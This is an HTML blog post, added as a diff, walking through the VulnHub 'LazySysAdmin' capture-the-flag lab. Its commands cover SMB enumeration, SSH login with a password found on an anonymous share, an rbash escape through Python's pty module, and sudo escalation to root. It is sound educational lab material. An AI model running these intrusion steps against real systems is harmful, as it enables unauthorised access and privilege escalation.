@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LazySysAdmin CTF Walkthrough — Rahul Lingampally</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 fill=%22%23090c0a%22/><text x=%2220%22 y=%2270%22 font-family=%22monospace%22 font-size=%2260%22 fill=%22%2339ff88%22>_</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<nav class="tmux-bar">
+  <div class="tmux-inner">
+    <span class="tmux-session">rahul@soc:~</span>
+    <a class="tmux-tab" href="../index.html#hero">whoami</a>
+    <a class="tmux-tab" href="../index.html#certs">certs</a>
+    <a class="tmux-tab" href="../index.html#skills">skills</a>
+    <a class="tmux-tab" href="../index.html#experience">experience</a>
+    <a class="tmux-tab" href="../index.html#projects">projects</a>
+    <a class="tmux-tab is-active" href="../blog.html">walkthroughs</a>
+    <a class="tmux-tab" href="../index.html#contact">contact</a>
+  </div>
+</nav>
+
+<section class="article-header">
+  <div class="wrap">
+    <span class="article-tag">rooted</span>
+    <h1 class="article-title">LazySysAdmin: From Enum4linux to Root</h1>
+    <div class="article-meta">VulnHub · Target 192.168.100.47 · Anonymous SMB share → rbash escape → sudo ALL:ALL</div>
+  </div>
+</section>
+
+<section class="article-body">
+  <div class="wrap">
+    <p>I just finished a fun box called "LazySysAdmin," and it was a perfect example of how a chain of simple, "lazy" misconfigurations can lead to a full system compromise. Here's my step-by-step path from initial scan to the root flag.</p>
+
+    <h2>1. Initial Scan: Finding the Doors</h2>
+    <p>As always, I started with an Nmap scan to see what services the machine was offering.</p>
+    <pre><code>┌──(root㉿kali)-[/home/kali/lazy]
+└─# nmap -sV -sC -oN nmap 192.168.100.47
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 14:26 EDT
+Nmap scan report for 192.168.100.47
+Host is up (0.0016s latency).
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
+3306/tcp open  mysql       MySQL (unauthorized)
+6667/tcp open  irc         InspIRCd
+...
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+...</code></pre>
+    <p>The Nmap scan gave me several key pieces of information:</p>
+    <ul>
+      <li><strong>Ports 139/445 (Samba)</strong> were open.</li>
+      <li>The <code>smb-security-mode</code> script reported <code>account_used: guest</code>, which strongly suggests anonymous access is enabled.</li>
+      <li><strong>Port 22 (SSH)</strong> was open, giving me a clear potential entry point if I could find credentials.</li>
+      <li><strong>Port 3306 (MySQL)</strong> was open but, as I later found, firewalled from external connections.</li>
+    </ul>
+
+    <h2>2. Foothold: A User and a Lazy Password</h2>
+    <p>Given the open Samba ports, my next step was to run <code>enum4linux</code> to perform a deep dive on the service. This is where I got my first big break.</p>
+    <pre><code>┌──(root㉿kali)-[/home/kali/lazy]
+└─# enum4linux 192.168.100.47
+...
+User "togie"
+...</code></pre>
+    <p><code>enum4linux</code> successfully enumerated the users on the box and found a user named <strong>togie</strong>.</p>
+    <p>Now I had a username. I still needed a password. The Nmap scan showed a guest account, so I checked for any anonymous shares I could access.</p>
+    <pre><code>┌──(root㉿kali)-[/home/kali/lazy]
+└─# smbclient -L //192.168.100.47 -N
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        share$          Disk      Sumshare
+        IPC$            IPC       IPC Service (Web server)</code></pre>
+    <p>The <code>share$</code> looked promising. I connected to it anonymously and found a goldmine.</p>
+    <pre><code>┌──(root㉿kali)-[/home/kali/lazy]
+└─# smbclient //192.168.100.47/share$ -N
+smb: \> ls
+  ...
+  deets.txt                           N      139  Mon Aug 14 08:20:05 2017
+  ...</code></pre>
+    <p>A file named <code>deets.txt</code> on an anonymous share? This is the definition of "lazy." I immediately downloaded it.</p>
+    <pre><code>smb: \> get deets.txt
+...
+┌──(root㉿kali)-[/home/kali/lazy]
+└─# cat deets.txt
+CBF Remembering all these passwords.
+
+Remember to remove this file and update your password after we push out the server.
+
+Password 12345</code></pre>
+    <p>This was it. I had a username (<code>togie</code>) and a password (<code>12345</code>). I immediately used them to log in via SSH.</p>
+    <pre><code>┌──(root㉿kali)-[/home/kali/lazy]
+└─# ssh togie@192.168.100.47
+togie@192.168.100.47's password: 12345
+...
+togie@LazySysAdmin:~$</code></pre>
+    <p>I was in!</p>
+
+    <h2>3. The "Jail": Escaping a Restricted Shell</h2>
+    <p>My initial celebration was short-lived. I quickly discovered I was in a restricted shell (<code>rbash</code>).</p>
+    <pre><code>togie@LazySysAdmin:~$ ls
+togie@LazySysAdmin:~$ cd ..
+-rbash: cd: restricted
+togie@LazySysAdmin:~$ cd /tmp
+-rbash: cd: restricted
+togie@LazySysAdmin:~$ /bin/bash
+-rbash: /bin/bash: restricted: cannot specify `/' in command names</code></pre>
+    <p>This shell is a "jail" designed to limit what I can do. I couldn't change directories or run any command that contained a slash (<code>/</code>), which is a major problem.</p>
+    <p>However, the "lazy" theme continued. I checked if any common interpreters were in my <code>$PATH</code>.</p>
+    <pre><code>togie@LazySysAdmin:~$ which python
+/usr/bin/python</code></pre>
+    <p>Bingo. If you can run Python, you can escape <code>rbash</code>. I used Python's <code>pty</code> module to spawn a full, unrestricted <code>/bin/bash</code> shell.</p>
+    <pre><code>togie@LazySysAdmin:~$ python
+>>> import pty
+>>> pty.spawn("/bin/bash")
+togie@LazySysAdmin:~$ whoami
+togie
+togie@LazySysAdmin:~$ cd /tmp
+togie@LazySysAdmin:/tmp$</code></pre>
+    <p>The jail was broken. I was now in a normal shell.</p>
+
+    <h2>4. Privilege Escalation: The 'ALL:ALL' Jackpot</h2>
+    <p>Now that I had a proper shell, my very next step was to check my <code>sudo</code> privileges.</p>
+    <pre><code>togie@LazySysAdmin:~$ sudo -l
+[sudo] password for togie: 12345
+Matching Defaults entries for togie on LazySysAdmin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User togie may run the following commands on LazySysAdmin:
+    (ALL : ALL) ALL</code></pre>
+    <p>This is the ultimate prize in privilege escalation: <strong>(ALL : ALL) ALL</strong>. This means the user <code>togie</code> can run any command as any user (including <code>root</code>) without even being prompted for a password again.</p>
+    <p>The "Lazy SysAdmin" strikes again!</p>
+
+    <h2>5. Rooted: Reading the Flag</h2>
+    <p>From here, the box was owned. I just had to ask <code>sudo</code> for a root shell.</p>
+    <pre><code>togie@LazySysAdmin:~$ sudo su
+root@LazySysAdmin:~# whoami
+root</code></pre>
+    <p>And just like that, I was root. I navigated to the root directory and claimed the final prize.</p>
+    <pre><code>root@LazySysAdmin:~# cat /root/proof.txt
+WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
+
+
+Well done :)
+
+Hope you learn't a few things along the way.
+
+Regards,
+
+Togie Mcdogie</code></pre>
+
+    <h2>Key Takeaways</h2>
+    <p>This box was a fantastic lesson in enumeration and "lazy" security practices.</p>
+    <ol>
+      <li><strong>Enumerate Everything:</strong> <code>enum4linux</code> found the user, and <code>smbclient</code> found the password.</li>
+      <li><strong>Look for Misconfigurations:</strong> An anonymous Samba share with sensitive files is a critical finding.</li>
+      <li><strong>Know Your Escapes:</strong> A restricted shell is only as good as its restrictions. A single allowed command like <code>python</code>, <code>vi</code>, or <code>find</code> can be a key to the outside.</li>
+      <li><strong>Always Check <code>sudo -l</code>:</strong> It's the fastest path to root, and you'd be surprised how often it's misconfigured.</li>
+    </ol>
+
+    <div class="article-back"><a class="btn" href="../blog.html">← all walkthroughs</a></div>
+  </div>
+</section>
+
+<footer>rahullingampally.online</footer>
+<script src="../assets/script.js"></script>
+</body>
+</html>
